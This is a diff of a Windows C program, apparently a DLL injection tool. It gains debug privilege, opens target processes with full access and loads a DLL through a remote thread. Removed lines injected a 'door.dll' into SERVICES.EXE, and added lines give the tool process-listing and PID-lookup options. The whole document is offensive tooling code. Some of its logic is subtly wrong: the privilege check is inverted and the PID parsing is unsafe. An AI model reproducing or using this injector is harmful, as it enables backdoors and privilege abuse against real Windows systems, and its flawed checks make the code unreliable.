@@ -3,27 +3,45 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 
-int EnableDebugPriv(const char * name){
+int EnableDebugPriv(){
     HANDLE hToken;
     TOKEN_PRIVILEGES tp;
     LUID luid;
 
     //Open process token 
-    OpenProcessToken(
+    BOOL ret = OpenProcessToken(
             GetCurrentProcess(),
             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
             &hToken
     );
 
+    if(!ret){
+        printf("cannot get the token\n");return 1;
+    }else{
+        printf("token success\n");
+    }
+
     //Gain process local ID
-    LookupPrivilegeValue(NULL, name, &luid);
+    ret = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
+
+    if(!ret){
+        printf("cannot get the luid\n"); return 1;
+    }else{
+        printf("luid success\n");
+    }
 
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     tp.Privileges[0].Luid = luid;
 
     //adjust privilege
-    AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+
+    if(GetLastError() != ERROR_SUCCESS){
+        printf("debug mode open success!!!\n");
+    }else{
+        printf("debug mode open failed\n");
+    }
     return 0;
 }
 
@@ -32,7 +50,7 @@ BOOL InjectDLL(const char *DllFullPath, const DWORD dwRemoteProcessId){
     char * pszLibFileRemote;
     PTHREAD_START_ROUTINE pfnStartAddr;
     //open debug mode to get high privilege
-    EnableDebugPriv(SE_DEBUG_NAME);
+    EnableDebugPriv();
 
     //open remote thread
     hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId);
@@ -65,19 +83,16 @@ BOOL InjectDLL(const char *DllFullPath, const DWORD dwRemoteProcessId){
     return TRUE;
 }
 
-DWORD GetProcessId(){
+DWORD getPIDByProcessName(char * processName){
     DWORD Pid = -1;
-    char * targetFile = "SERVICES.EXE";
     PROCESSENTRY32 lPrs;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    //create system snapshot
     ZeroMemory(&lPrs, sizeof(lPrs));
     lPrs.dwSize = sizeof(lPrs);
     Process32First(hSnap, &lPrs);
 
-    //get first process's info in system snapshot
-    if(strstr(targetFile, lPrs.szExeFile)){ 
+    if(strstr(processName, lPrs.szExeFile)){ 
         Pid = lPrs.th32ProcessID;
         return Pid;
     }
@@ -91,7 +106,7 @@ DWORD GetProcessId(){
             break;
         }
 
-        if(strstr(targetFile, lPrs.szExeFile)){
+        if(strstr(processName, lPrs.szExeFile)){
             Pid = lPrs.th32ProcessID;
             break;
         }
@@ -100,11 +115,82 @@ DWORD GetProcessId(){
     return Pid;
 }
 
-void main(){
-    char myFILE[MAX_PATH];
-    GetCurrentDirectory(MAX_PATH, myFILE);
-    //get current path concat with myFILE
-    strcat(myFILE, "\\door.dll"); 
-    //notice!! GetProcessId is which process ID that you want to inject;
-    InjectDLL(myFILE, GetProcessId());
+void listAllProcessInfo(){
+    PROCESSENTRY32 lPrs;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    ZeroMemory(&lPrs, sizeof(lPrs));
+    lPrs.dwSize = sizeof(lPrs);
+    Process32First(hSnap, &lPrs);
+
+    printf("pid\t\tppid\t\tname\n");
+    printf("-------------------------------------------\n");
+
+    while(1){
+        printf("%d\t\t%d\t\t%s\n", lPrs.th32ProcessID, lPrs.th32ParentProcessID, lPrs.szExeFile);
+        if(!Process32Next(hSnap, &lPrs)) break;
+    }    
+}
+
+void showUsageHelp(){
+    printf("inject.exe example:\n");
+    printf("============================================================\n");
+    printf("    list process         :  inject.exe -l \n");
+    printf("    special process Name :  inject.exe -n <process name>\n");
+    printf("    special process ID   :  inject.exe -p <PID>\n");
+}
+
+DWORD string2dword(char * str){
+    DWORD i = 0, len = strlen(str), sum = 0;
+
+    for(;i<len; i++){
+        DWORD tmp = *(str+i) - 48;
+
+        switch(len-i-1){
+            case 0:
+                sum += tmp;break;
+            case 1:
+                sum += tmp*10; break;
+            case 2:
+                sum += tmp*100; break;
+            case 3:
+                sum += tmp*1000; break;
+            case 4:
+                sum += tmp*10000; break;
+            default:
+                printf("invalid pid!!\n");
+                return -1;
+        }
+    }
+
+    return sum;
+}
+
+void main(int argc, char *argv[]){
+
+    if(argc < 2){
+        showUsageHelp();
+        return;
+    }
+
+    else if(!stricmp(argv[1], "-l")){
+        listAllProcessInfo();
+    }
+
+    else if(!stricmp(argv[1], "-n")){
+        printf("pid: %d\n", getPIDByProcessName(argv[2]));
+    }
+
+    else if(!stricmp(argv[1], "-p")){
+        printf("pid: %lu\n", string2dword(argv[2]));
+    }
+    
+    EnableDebugPriv(); 
+
+    //char myFILE[MAX_PATH];
+    //GetCurrentDirectory(MAX_PATH, myFILE);
+    ////get current path concat with myFILE
+    //strcat(myFILE, "\\door.dll"); 
+    ////notice!! GetProcessId is which process ID that you want to inject;
+    //InjectDLL(myFILE, GetProcessId());
 }
